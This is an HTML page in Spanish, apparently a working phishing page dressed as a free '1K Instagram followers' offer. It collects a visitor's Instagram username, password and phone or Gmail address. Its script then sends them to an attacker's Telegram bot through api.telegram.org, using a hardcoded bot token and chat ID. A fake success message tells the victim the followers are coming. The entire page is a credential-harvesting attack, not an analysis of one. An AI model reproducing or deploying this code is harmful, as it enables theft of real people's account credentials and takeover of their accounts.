<!DOCTYPE html>
<html>
<head>
  <title>Gana 1000 Seguidores en Instagram</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h2 {
      margin-bottom: 20px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 2px;
      text-shadow: 1px 1px 5px rgba(0,0,0,0.3);
    }
    input {
      width: 300px;
      padding: 12px 15px;
      margin: 10px 0;
      border-radius: 30px;
      border: none;
      outline: none;
      font-size: 16px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
      transition: box-shadow 0.3s ease;
    }
    input:focus {
      box-shadow: 0 4px 12px #fff;
      background-color: rgba(255,255,255,0.1);
      color: white;
    }
    button {
      margin-top: 20px;
      background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
      border: none;
      padding: 12px 40px;
      border-radius: 30px;
      color: white;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(255,255,255,0.4);
      transition: background 0.3s ease;
    }
    button:hover {
      background: linear-gradient(45deg, #dd2a7b, #f58529, #515bd4, #8134af);
    }
  </style>
</head>
<body>
    <h1>Gana 1K de seguidores en Instagram rápido y seguro ¡Que esperas!</h1>
  <h2>Ingresa tus datos</h2>

  <input type="text" id="usuario" placeholder="Nombre de Usuario"><br>
  <input type="password" id="contrasena" placeholder="Contraseña"><br>
  <input type="text" id="contacto" placeholder="Teléfono o Gmail"><br>
  <button onclick="enviarDatos()">Enviar</button>

  <script>
    const BOT_TOKEN = '8448020666:AAE8S9S0VZohBJ6LTWMH6TO4wk6aX8yPxks'; 
    const CHAT_ID = '6795232859'; 

    function enviarDatos() {
      const usuario = document.getElementById('usuario').value.trim();
      const contrasena = document.getElementById('contrasena').value.trim();
      const contacto = document.getElementById('contacto').value.trim();

      if (!usuario ||!contrasena ||!contacto) {
        alert('Por favor completa todos los campos.');
        return;
      }

      const mensaje = `
Nuevo registro:
Usuario: ${usuario}
Contraseña: ${contrasena}
Teléfono o Gmail: ${contacto}
      `;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensaje
        })
      }).then(response => {
        if (response.ok) {
          alert('¡Datos enviados correctamente!¡Estara listo en menos de 5 minutos!');
          document.getElementById('usuario').value = '';
          document.getElementById('contrasena').value = '';
          document.getElementById('contacto').value = '';
        } else {
          alert('Error enviando datos.');
        }
      }).catch(() => alert('Error enviando datos.'));
    }
  </script>
</body>
</html>
